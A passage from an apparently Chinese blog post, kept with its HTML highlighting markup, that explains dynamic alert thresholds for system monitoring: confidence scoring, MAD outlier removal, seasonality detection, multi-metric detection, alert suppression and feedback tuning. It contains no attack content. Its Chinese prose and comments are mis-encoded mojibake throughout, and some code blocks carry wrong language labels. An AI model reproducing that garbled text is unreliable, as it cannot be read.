        2. æ¨¡å¼è¶Šç¨³å®šï¼ˆæ®‹å·®è¶Šå°ï¼‰
        3. å­£èŠ‚æ€§è¶Šæ˜æ˜¾
        """</span>
        <span class="hljs-comment"># å› å­1ï¼šæ•°æ®å……è¶³åº¦ï¼ˆ0-1ï¼‰</span>
        data_sufficiency = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(self.history) / self.window_size, <span class="hljs-number">1.0</span>)
        
        <span class="hljs-comment"># å› å­2ï¼šæ¨¡å¼ç¨³å®šæ€§ï¼ˆ0-1ï¼‰</span>
        <span class="hljs-comment"># æ®‹å·®æ ‡å‡†å·®è¶Šå°ï¼Œç¨³å®šæ€§è¶Šé«˜</span>
        residual_cv = (
            decomposition[<span class="hljs-string">'residual_std'</span>] / 
            (<span class="hljs-built_in">abs</span>(decomposition[<span class="hljs-string">'current_trend'</span>]) + <span class="hljs-number">1e-6</span>)
        )
        pattern_stability = <span class="hljs-number">1.0</span> / (<span class="hljs-number">1.0</span> + residual_cv)
        
        <span class="hljs-comment"># å› å­3ï¼šå­£èŠ‚æ€§å¼ºåº¦ï¼ˆ0-1ï¼‰</span>
        seasonal_strength = <span class="hljs-built_in">min</span>(
            <span class="hljs-built_in">abs</span>(decomposition[<span class="hljs-string">'seasonal_factor'</span>]), 
            <span class="hljs-number">1.0</span>
        )
        
        <span class="hljs-comment"># ç»¼åˆç½®ä¿¡åº¦ï¼ˆåŠ æƒå¹³å‡ï¼‰</span>
        confidence = (
            <span class="hljs-number">0.4</span> * data_sufficiency +
            <span class="hljs-number">0.4</span> * pattern_stability +
            <span class="hljs-number">0.2</span> * seasonal_strength
        )
        
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">round</span>(confidence, <span class="hljs-number">3</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_analyze_trend</span>(<span class="hljs-params">self, trend</span>):
        <span class="hljs-string">"""åˆ†æè¶‹åŠ¿æ–¹å‘"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(trend) &lt; <span class="hljs-number">24</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'stable'</span>
        
        <span class="hljs-comment"># æ¯”è¾ƒæœ€è¿‘24å°æ—¶çš„è¶‹åŠ¿</span>
        recent_trend = trend[-<span class="hljs-number">24</span>:]
        slope = np.polyfit(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(recent_trend)), recent_trend, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]
        
        <span class="hljs-comment"># ç›¸å¯¹å˜åŒ–ç‡</span>
        relative_slope = slope / (np.mean(recent_trend) + <span class="hljs-number">1e-6</span>)
        
        <span class="hljs-keyword">if</span> relative_slope &gt; <span class="hljs-number">0.01</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'increasing'</span>
        <span class="hljs-keyword">elif</span> relative_slope &lt; -<span class="hljs-number">0.01</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'decreasing'</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'stable'</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_deviation_percentage</span>(<span class="hljs-params">self, current, expected</span>):
        <span class="hljs-string">"""è®¡ç®—åç¦»ç™¾åˆ†æ¯”"""</span>
        <span class="hljs-keyword">if</span> expected == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-number">0.0</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">round</span>(((current - expected) / expected) * <span class="hljs-number">100</span>, <span class="hljs-number">2</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_preprocess_series</span>(<span class="hljs-params">self, values</span>):
        <span class="hljs-string">"""é¢„å¤„ç†æ—¶é—´åºåˆ—"""</span>
        <span class="hljs-comment"># å¤„ç†ç¼ºå¤±å€¼ï¼ˆçº¿æ€§æ’å€¼ï¼‰</span>
        values = pd.Series(values).interpolate(method=<span class="hljs-string">'linear'</span>).values
        
        <span class="hljs-comment"># å¤„ç†å¼‚å¸¸å€¼ï¼ˆä½¿ç”¨ä¸­ä½æ•°ç»å¯¹åå·®MADæ–¹æ³•ï¼‰</span>
        median = np.median(values)
        mad = np.median(np.<span class="hljs-built_in">abs</span>(values - median))
        threshold = <span class="hljs-number">3</span> * mad
        
        <span class="hljs-comment"># å°†å¼‚å¸¸å€¼æ›¿æ¢ä¸ºä¸­ä½æ•°</span>
        values = np.where(
            np.<span class="hljs-built_in">abs</span>(values - median) &gt; threshold,
            median,
            values
        )
        
        <span class="hljs-keyword">return</span> values
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_validate_data</span>(<span class="hljs-params">self, value</span>):
        <span class="hljs-string">"""æ•°æ®éªŒè¯"""</span>
        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> np.isnan(value) <span class="hljs-keyword">or</span> np.isinf(value):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_default_response</span>(<span class="hljs-params">self, value</span>):
        <span class="hljs-string">"""æ— æ•ˆæ•°æ®çš„é»˜è®¤å“åº”"""</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>,
            <span class="hljs-string">'alert_type'</span>: <span class="hljs-string">'invalid_data'</span>,
            <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.0</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_bootstrap_response</span>(<span class="hljs-params">self, value</span>):
        <span class="hljs-string">"""æ•°æ®ä¸è¶³æ—¶çš„å“åº”"""</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'current_value'</span>: value,
            <span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>,
            <span class="hljs-string">'alert_type'</span>: <span class="hljs-string">'bootstrapping'</span>,
            <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.0</span>,
            <span class="hljs-string">'message'</span>: <span class="hljs-string">f'éœ€è¦è‡³å°‘<span class="hljs-subst">{self.min_samples}</span>ä¸ªæ•°æ®ç‚¹'</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_fallback_response</span>(<span class="hljs-params">self, value</span>):
        <span class="hljs-string">"""åˆ†è§£å¤±è´¥æ—¶çš„é™çº§å“åº”"""</span>
        <span class="hljs-comment"># ä½¿ç”¨ç®€å•çš„ç§»åŠ¨å¹³å‡ä½œä¸ºé™çº§æ–¹æ¡ˆ</span>
        values = [p[<span class="hljs-string">'value'</span>] <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> self.history]
        mean = np.mean(values)
        std = np.std(values)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'current_value'</span>: value,
            <span class="hljs-string">'upper_bound'</span>: mean + <span class="hljs-number">3</span> * std,
            <span class="hljs-string">'lower_bound'</span>: mean - <span class="hljs-number">3</span> * std,
            <span class="hljs-string">'is_alert'</span>: value &gt; mean + <span class="hljs-number">3</span> * std <span class="hljs-keyword">or</span> value &lt; mean - <span class="hljs-number">3</span> * std,
            <span class="hljs-string">'alert_type'</span>: <span class="hljs-string">'fallback_mode'</span>,
            <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.5</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_statistics</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""è·å–ç»Ÿè®¡ä¿¡æ¯"""</span>
        <span class="hljs-keyword">if</span> self.stats[<span class="hljs-string">'total_points'</span>] &gt; <span class="hljs-number">0</span>:
            alert_rate = (
                self.stats[<span class="hljs-string">'alerts_triggered'</span>] / 
                self.stats[<span class="hljs-string">'total_points'</span>]
            )
        <span class="hljs-keyword">else</span>:
            alert_rate = <span class="hljs-number">0.0</span>
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'total_points'</span>: self.stats[<span class="hljs-string">'total_points'</span>],
            <span class="hljs-string">'alerts_triggered'</span>: self.stats[<span class="hljs-string">'alerts_triggered'</span>],
            <span class="hljs-string">'alert_rate'</span>: <span class="hljs-built_in">round</span>(alert_rate * <span class="hljs-number">100</span>, <span class="hljs-number">2</span>)
        }
</code></pre>
<p>3.2.2 å®é™…ä½¿ç”¨ç¤ºä¾‹</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># åˆå§‹åŒ–åŠ¨æ€é˜ˆå€¼ç”Ÿæˆå™¨</span>
<span class="hljs-attr">threshold_gen</span> = DynamicThresholdGenerator(
    <span class="hljs-attr">window_size</span>=<span class="hljs-number">168</span>,      <span class="hljs-comment"># 7å¤©æ•°æ®</span>
    <span class="hljs-attr">seasonal_period</span>=<span class="hljs-number">24</span>,   <span class="hljs-comment"># 24å°æ—¶å‘¨æœŸ</span>
    <span class="hljs-attr">sigma_multiplier</span>=<span class="hljs-number">3</span>,   <span class="hljs-comment"># 3Ïƒ</span>
    <span class="hljs-attr">min_samples</span>=<span class="hljs-number">48</span>        <span class="hljs-comment"># è‡³å°‘2å¤©æ•°æ®</span>
)

<span class="hljs-comment"># æ¨¡æ‹Ÿå®æ—¶æ•°æ®æµ</span>
import random
from datetime import datetime, timedelta

<span class="hljs-attr">base_time</span> = datetime.now() - timedelta(days=<span class="hljs-number">7</span>)

for hour in range(168):  <span class="hljs-comment"># 7å¤©æ•°æ®</span>
    <span class="hljs-attr">timestamp</span> = base_time + timedelta(hours=hour)
    
    <span class="hljs-comment"># æ¨¡æ‹ŸçœŸå®ä¸šåŠ¡æ•°æ®ï¼š</span>
    <span class="hljs-comment"># åŸºç¡€è´Ÿè½½ + æ—¥å‘¨æœŸ + å‘¨å‘¨æœŸ + éšæœºå™ªå£°</span>
    <span class="hljs-attr">base_load</span> = <span class="hljs-number">50</span>
    <span class="hljs-attr">daily_pattern</span> = <span class="hljs-number">20</span> * np.sin(<span class="hljs-number">2</span> * np.pi * hour / <span class="hljs-number">24</span>)
    <span class="hljs-attr">weekly_pattern</span> = <span class="hljs-number">10</span> * np.sin(<span class="hljs-number">2</span> * np.pi * hour / <span class="hljs-number">168</span>)
    <span class="hljs-attr">noise</span> = random.gauss(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>)
    
    <span class="hljs-attr">cpu_usage</span> = base_load + daily_pattern + weekly_pattern + noise
    
    <span class="hljs-comment"># æ›´æ–°é˜ˆå€¼å¹¶è·å–ç»“æœ</span>
    <span class="hljs-attr">result</span> = threshold_gen.update_and_get_thresholds(cpu_usage, timestamp)
    
    <span class="hljs-comment"># å¦‚æœè§¦å‘å‘Šè­¦ï¼Œæ‰“å°è¯¦ç»†ä¿¡æ¯</span>
    if result<span class="hljs-section">['is_alert']</span>:
        print(f"""
        âš ï¸  å‘Šè­¦è§¦å‘ï¼
        æ—¶é—´: {result<span class="hljs-section">['timestamp']</span>}
        å½“å‰å€¼: {result<span class="hljs-section">['current_value']</span>:.2f}%
        é¢„æœŸå€¼: {result<span class="hljs-section">['expected_value']</span>:.2f}%
        ä¸Šç•Œ: {result<span class="hljs-section">['upper_bound']</span>:.2f}%
        ä¸‹ç•Œ: {result<span class="hljs-section">['lower_bound']</span>:.2f}%
        åç¦»åº¦: {result<span class="hljs-section">['deviation_percentage']</span>}%
        å‘Šè­¦ç±»å‹: {result<span class="hljs-section">['alert_type']</span>}
        ç½®ä¿¡åº¦: {result<span class="hljs-section">['confidence']</span>}
        è¶‹åŠ¿: {result<span class="hljs-section">['trend']</span>}
        """)

<span class="hljs-comment"># æ‰“å°ç»Ÿè®¡ä¿¡æ¯</span>
<span class="hljs-attr">stats</span> = threshold_gen.get_statistics()
print(f"\nç»Ÿè®¡ä¿¡æ¯ï¼š")
print(f"æ€»æ•°æ®ç‚¹: {stats<span class="hljs-section">['total_points']</span>}")
print(f"å‘Šè­¦æ¬¡æ•°: {stats<span class="hljs-section">['alerts_triggered']</span>}")
print(f"å‘Šè­¦ç‡: {stats<span class="hljs-section">['alert_rate']</span>}%")
</code></pre>
<h3 data-id="heading-11">3.3 å…³é”®æŠ€æœ¯ç»†èŠ‚è§£æ</h3>
<h3 data-id="heading-12">3.3.1 æ»‘åŠ¨çª—å£çš„é€‰æ‹©</h3>
<p>çª—å£å¤§å°çš„æƒè¡¡ï¼š</p>
<ul>
<li>å¤ªå°ï¼ˆå¦‚24å°æ—¶ï¼‰ï¼šæ— æ³•æ•æ‰å‘¨å‘¨æœŸï¼Œå¯¹çªå‘äº‹ä»¶æ•æ„Ÿåº¦è¿‡é«˜</li>
<li>å¤ªå¤§ï¼ˆå¦‚30å¤©ï¼‰ï¼šå“åº”é€Ÿåº¦æ…¢ï¼Œæ— æ³•å¿«é€Ÿé€‚åº”ä¸šåŠ¡å˜åŒ–</li>
<li>æ¨èï¼š7å¤©ï¼ˆ168å°æ—¶ï¼‰æ˜¯ä¸€ä¸ªå¹³è¡¡ç‚¹</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># ä¸åŒä¸šåŠ¡åœºæ™¯çš„çª—å£é…ç½®</span>
<span class="hljs-string">WINDOW_CONFIGS</span> <span class="hljs-string">=</span> {
    <span class="hljs-attr">'high_frequency_trading':</span> <span class="hljs-number">24</span>,      <span class="hljs-comment"># é«˜é¢‘äº¤æ˜“ï¼š1å¤©</span>
    <span class="hljs-attr">'web_service':</span> <span class="hljs-number">168</span>,                <span class="hljs-comment"># WebæœåŠ¡ï¼š7å¤©</span>
    <span class="hljs-attr">'batch_processing':</span> <span class="hljs-number">720</span>,           <span class="hljs-comment"># æ‰¹å¤„ç†ï¼š30å¤©</span>
    <span class="hljs-attr">'iot_sensor':</span> <span class="hljs-number">8760</span>                 <span class="hljs-comment"># IoTä¼ æ„Ÿå™¨ï¼š1å¹´</span>
}
</code></pre>
<h3 data-id="heading-13">3.3.2 å­£èŠ‚å‘¨æœŸçš„è¯†åˆ«</h3>
<p>è‡ªåŠ¨å‘¨æœŸæ£€æµ‹ï¼ˆä½¿ç”¨è‡ªç›¸å…³å‡½æ•°ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> statsmodels.tsa.stattools <span class="hljs-keyword">import</span> acf

<span class="hljs-keyword">def</span> <span class="hljs-title function_">auto_detect_seasonality</span>(<span class="hljs-params">values, max_lag=<span class="hljs-number">168</span></span>):
    <span class="hljs-string">"""è‡ªåŠ¨æ£€æµ‹å­£èŠ‚å‘¨æœŸ"""</span>
    <span class="hljs-comment"># è®¡ç®—è‡ªç›¸å…³ç³»æ•°</span>
    acf_values = acf(values, nlags=max_lag)
    
    <span class="hljs-comment"># å¯»æ‰¾ç¬¬ä¸€ä¸ªæ˜¾è‘—çš„å³°å€¼ï¼ˆæ’é™¤lag=0ï¼‰</span>
    peaks = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(acf_values) - <span class="hljs-number">1</span>):
        <span class="hljs-keyword">if</span> (acf_values[i] &gt; acf_values[i-<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> 
            acf_values[i] &gt; acf_values[i+<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span>
            acf_values[i] &gt; <span class="hljs-number">0.3</span>):  <span class="hljs-comment"># æ˜¾è‘—æ€§é˜ˆå€¼</span>
            peaks.append((i, acf_values[i]))
    
    <span class="hljs-keyword">if</span> peaks:
        <span class="hljs-comment"># è¿”å›æœ€æ˜¾è‘—çš„å‘¨æœŸ</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(peaks, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>])[<span class="hljs-number">0</span>]
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">24</span>  <span class="hljs-comment"># é»˜è®¤24å°æ—¶</span>
</code></pre>
<h3 data-id="heading-14">3.3.3 å¼‚å¸¸å€¼çš„é²æ£’å¤„ç†</h3>
<p>é—®é¢˜ï¼šå†å²æ•°æ®ä¸­çš„å¼‚å¸¸å€¼ä¼šæ±¡æŸ“æ¨¡å‹</p>
<p>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨MADï¼ˆMedian Absolute Deviationï¼‰æ–¹æ³•</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">robust_outlier_removal</span>(<span class="hljs-params">values</span>):
    <span class="hljs-string">"""é²æ£’çš„å¼‚å¸¸å€¼ç§»é™¤"""</span>
    median = np.median(values)
    mad = np.median(np.<span class="hljs-built_in">abs</span>(values - median))
    
    <span class="hljs-comment"># MADæ ‡å‡†åŒ–</span>
    modified_z_scores = <span class="hljs-number">0.6745</span> * (values - median) / mad
    
    <span class="hljs-comment"># æ ‡è®°å¼‚å¸¸å€¼ï¼ˆ|z| &gt; 3.5ï¼‰</span>
    outliers = np.<span class="hljs-built_in">abs</span>(modified_z_scores) &gt; <span class="hljs-number">3.5</span>
    
    <span class="hljs-comment"># ç”¨ä¸­ä½æ•°æ›¿æ¢å¼‚å¸¸å€¼</span>
    cleaned_values = values.copy()
    cleaned_values[outliers] = median
    
    <span class="hljs-keyword">return</span> cleaned_values, outliers
</code></pre>
<h2 data-id="heading-15">å››ã€è¿›é˜¶ä¼˜åŒ–ï¼šä»"èƒ½ç”¨"åˆ°"å¥½ç”¨"</h2>
<h3 data-id="heading-16">4.1 å¤šæŒ‡æ ‡è”åˆåˆ¤æ–­</h3>
<pre><code class="hljs language-python" lang="python">å•ä¸€æŒ‡æ ‡çš„å‘Šè­¦å®¹æ˜“è¯¯åˆ¤ï¼Œç»“åˆå¤šä¸ªç›¸å…³æŒ‡æ ‡å¯ä»¥æé«˜å‡†ç¡®æ€§ï¼š
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiMetricAnomalyDetector</span>:
    <span class="hljs-string">"""å¤šæŒ‡æ ‡è”åˆå¼‚å¸¸æ£€æµ‹"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.detectors = {
            <span class="hljs-string">'cpu'</span>: DynamicThresholdGenerator(),
            <span class="hljs-string">'memory'</span>: DynamicThresholdGenerator(),
            <span class="hljs-string">'response_time'</span>: DynamicThresholdGenerator()
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">detect</span>(<span class="hljs-params">self, metrics, timestamp</span>):
        <span class="hljs-string">"""
        è”åˆæ£€æµ‹é€»è¾‘ï¼š
        1. å•æŒ‡æ ‡å¼‚å¸¸ + ä½ç½®ä¿¡åº¦ â†’ ä¸å‘Šè­¦
        2. å¤šæŒ‡æ ‡åŒæ—¶å¼‚å¸¸ â†’ é«˜ä¼˜å…ˆçº§å‘Šè­¦
        3. å…³è”æŒ‡æ ‡å¼‚å¸¸ â†’ æ ¹å› åˆ†æ
        """</span>
        results = {}
        <span class="hljs-keyword">for</span> metric_name, value <span class="hljs-keyword">in</span> metrics.items():
            results[metric_name] = self.detectors[metric_name].update_and_get_thresholds(
                value, timestamp
            )
        
        <span class="hljs-comment"># è®¡ç®—è”åˆå‘Šè­¦åˆ†æ•°</span>
        alert_score = <span class="hljs-number">0</span>
        <span class="hljs-keyword">for</span> metric, result <span class="hljs-keyword">in</span> results.items():
            <span class="hljs-keyword">if</span> result[<span class="hljs-string">'is_alert'</span>]:
                alert_score += result[<span class="hljs-string">'confidence'</span>]
        
        <span class="hljs-comment"># å‘Šè­¦å†³ç­–</span>
        <span class="hljs-keyword">if</span> alert_score &gt; <span class="hljs-number">1.5</span>:  <span class="hljs-comment"># è‡³å°‘2ä¸ªé«˜ç½®ä¿¡åº¦æŒ‡æ ‡å¼‚å¸¸</span>
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">True</span>,
                <span class="hljs-string">'severity'</span>: <span class="hljs-string">'critical'</span> <span class="hljs-keyword">if</span> alert_score &gt; <span class="hljs-number">2.5</span> <span class="hljs-keyword">else</span> <span class="hljs-string">'warning'</span>,
                <span class="hljs-string">'details'</span>: results,
                <span class="hljs-string">'root_cause'</span>: self._analyze_root_cause(results)
            }
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>}
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_analyze_root_cause</span>(<span class="hljs-params">self, results</span>):
        <span class="hljs-string">"""ç®€å•çš„æ ¹å› åˆ†æ"""</span>
        <span class="hljs-keyword">if</span> results[<span class="hljs-string">'cpu'</span>][<span class="hljs-string">'is_alert'</span>] <span class="hljs-keyword">and</span> results[<span class="hljs-string">'response_time'</span>][<span class="hljs-string">'is_alert'</span>]:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'CPUç“¶é¢ˆå¯¼è‡´å“åº”æ—¶é—´ä¸Šå‡'</span>
        <span class="hljs-keyword">elif</span> results[<span class="hljs-string">'memory'</span>][<span class="hljs-string">'is_alert'</span>]:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'å†…å­˜æ³„æ¼æˆ–å†…å­˜ä¸è¶³'</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'æœªçŸ¥åŸå› '</span>
</code></pre>
<h3 data-id="heading-17">4.2 å‘Šè­¦æŠ‘åˆ¶ä¸èšåˆ</h3>
<p>é—®é¢˜ï¼šå³ä½¿æ˜¯åŠ¨æ€é˜ˆå€¼ï¼ŒçŸ­æ—¶é—´å†…ä»å¯èƒ½äº§ç”Ÿå¤§é‡é‡å¤å‘Šè­¦</p>
<p>è§£å†³æ–¹æ¡ˆï¼šå®ç°æ™ºèƒ½å‘Šè­¦æŠ‘åˆ¶</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AlertSuppressor</span>:
    <span class="hljs-string">"""å‘Šè­¦æŠ‘åˆ¶å™¨"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, 
                 cooldown_period=<span class="hljs-number">300</span>,      <span class="hljs-comment"># 5åˆ†é’Ÿå†·å´æœŸ</span>
                 aggregation_window=<span class="hljs-number">60</span></span>):   <span class="hljs-comment"># 1åˆ†é’Ÿèšåˆçª—å£</span>
        self.cooldown_period = cooldown_period
        self.aggregation_window = aggregation_window
        self.last_alert_time = {}
        self.pending_alerts = []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_alert</span>(<span class="hljs-params">self, metric_name, current_time</span>):
        <span class="hljs-string">"""åˆ¤æ–­æ˜¯å¦åº”è¯¥å‘é€å‘Šè­¦"""</span>
        <span class="hljs-keyword">if</span> metric_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.last_alert_time:
            self.last_alert_time[metric_name] = current_time
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        
        time_since_last = (current_time - self.last_alert_time[metric_name]).total_seconds()
        
        <span class="hljs-keyword">if</span> time_since_last &lt; self.cooldown_period:
            <span class="hljs-comment"># åœ¨å†·å´æœŸå†…ï¼Œä¸å‘é€å‘Šè­¦</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">else</span>:
            self.last_alert_time[metric_name] = current_time
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">aggregate_alerts</span>(<span class="hljs-params">self, alerts</span>):
        <span class="hljs-string">"""èšåˆç›¸ä¼¼å‘Šè­¦"""</span>
        <span class="hljs-comment"># æŒ‰æŒ‡æ ‡ç±»å‹å’Œå‘Šè­¦ç±»å‹åˆ†ç»„</span>
        grouped = {}
        <span class="hljs-keyword">for</span> alert <span class="hljs-keyword">in</span> alerts:
            key = (alert[<span class="hljs-string">'metric'</span>], alert[<span class="hljs-string">'alert_type'</span>])
            <span class="hljs-keyword">if</span> key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> grouped:
                grouped[key] = []
            grouped[key].append(alert)
        
        <span class="hljs-comment"># ç”Ÿæˆèšåˆå‘Šè­¦</span>
        aggregated = []
        <span class="hljs-keyword">for</span> key, alert_list <span class="hljs-keyword">in</span> grouped.items():
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(alert_list) &gt; <span class="hljs-number">1</span>:
                aggregated.append({
                    <span class="hljs-string">'metric'</span>: key[<span class="hljs-number">0</span>],
                    <span class="hljs-string">'alert_type'</span>: key[<span class="hljs-number">1</span>],
                    <span class="hljs-string">'count'</span>: <span class="hljs-built_in">len</span>(alert_list),
                    <span class="hljs-string">'first_occurrence'</span>: alert_list[<span class="hljs-number">0</span>][<span class="hljs-string">'timestamp'</span>],
                    <span class="hljs-string">'last_occurrence'</span>: alert_list[-<span class="hljs-number">1</span>][<span class="hljs-string">'timestamp'</span>],
                    <span class="hljs-string">'severity'</span>: <span class="hljs-built_in">max</span>(a[<span class="hljs-string">'severity'</span>] <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> alert_list),
                    <span class="hljs-string">'summary'</span>: <span class="hljs-string">f"<span class="hljs-subst">{key[<span class="hljs-number">0</span>]}</span>åœ¨è¿‡å»<span class="hljs-subst">{self.aggregation_window}</span>ç§’å†…è§¦å‘<span class="hljs-subst">{<span class="hljs-built_in">len</span>(alert_list)}</span>æ¬¡<span class="hljs-subst">{key[<span class="hljs-number">1</span>]}</span>å‘Šè­¦"</span>
                })
            <span class="hljs-keyword">else</span>:
                aggregated.append(alert_list[<span class="hljs-number">0</span>])
        
        <span class="hljs-keyword">return</span> aggregated
</code></pre>
<h3 data-id="heading-18">4.3 è‡ªé€‚åº”å­¦ä¹ ä¸åé¦ˆæœºåˆ¶</h3>
<p>æ ¸å¿ƒæ€æƒ³ï¼šä»è¿ç»´äººå‘˜çš„åé¦ˆä¸­å­¦ä¹ ï¼ŒæŒç»­ä¼˜åŒ–é˜ˆå€¼</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdaptiveLearningSystem</span>:
    <span class="hljs-string">"""è‡ªé€‚åº”å­¦ä¹ ç³»ç»Ÿ"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, threshold_generator</span>):
        self.threshold_gen = threshold_generator
        self.feedback_history = []
        self.false_positive_count = <span class="hljs-number">0</span>
        self.true_positive_count = <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">record_feedback</span>(<span class="hljs-params">self, alert_id, is_true_positive</span>):
        <span class="hljs-string">"""è®°å½•è¿ç»´äººå‘˜çš„åé¦ˆ"""</span>
        self.feedback_history.append({
            <span class="hljs-string">'alert_id'</span>: alert_id,
            <span class="hljs-string">'is_true_positive'</span>: is_true_positive,
            <span class="hljs-string">'timestamp'</span>: datetime.now()
        })
        
        <span class="hljs-keyword">if</span> is_true_positive:
            self.true_positive_count += <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            self.false_positive_count += <span class="hljs-number">1</span>
            <span class="hljs-comment"># è¯¯æŠ¥ï¼šæ”¾å®½é˜ˆå€¼</span>
            self._adjust_threshold(direction=<span class="hljs-string">'relax'</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_adjust_threshold</span>(<span class="hljs-params">self, direction=<span class="hljs-string">'relax'</span></span>):
        <span class="hljs-string">"""åŠ¨æ€è°ƒæ•´sigmaå€æ•°"""</span>
        current_sigma = self.threshold_gen.sigma_multiplier
        
        <span class="hljs-keyword">if</span> direction == <span class="hljs-string">'relax'</span>:
            <span class="hljs-comment"># è¯¯æŠ¥ç‡é«˜ï¼šå¢åŠ sigmaå€æ•°ï¼ˆæ”¾å®½é˜ˆå€¼ï¼‰</span>
            new_sigma = <span class="hljs-built_in">min</span>(current_sigma * <span class="hljs-number">1.1</span>, <span class="hljs-number">5.0</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># æ¼æŠ¥ç‡é«˜ï¼šå‡å°‘sigmaå€æ•°ï¼ˆæ”¶ç´§é˜ˆå€¼ï¼‰</span>
            new_sigma = <span class="hljs-built_in">max</span>(current_sigma * <span class="hljs-number">0.9</span>, <span class="hljs-number">2.0</span>)
        
        self.threshold_gen.sigma_multiplier = new_sigma
        
        logging.info(<span class="hljs-string">f"é˜ˆå€¼è°ƒæ•´: <span class="hljs-subst">{current_sigma:<span class="hljs-number">.2</span>f}</span> â†’ <span class="hljs-subst">{new_sigma:<span class="hljs-number">.2</span>f}</span>"</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_accuracy_metrics</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""è®¡ç®—å‡†ç¡®ç‡æŒ‡æ ‡"""</span>
        total = self.true_positive_count + self.false_positive_count
        <span class="hljs-keyword">if</span> total == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'precision'</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">'feedback_count'</span>: <span class="hljs-number">0</span>}
        
        precision = self.true_positive_count / total
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'precision'</span>: <span class="hljs-built_in">round</span>(precision, <span class="hljs-number">3</span>),
            <span class="hljs-string">'true_positives'</span>: self.true_positive_count,
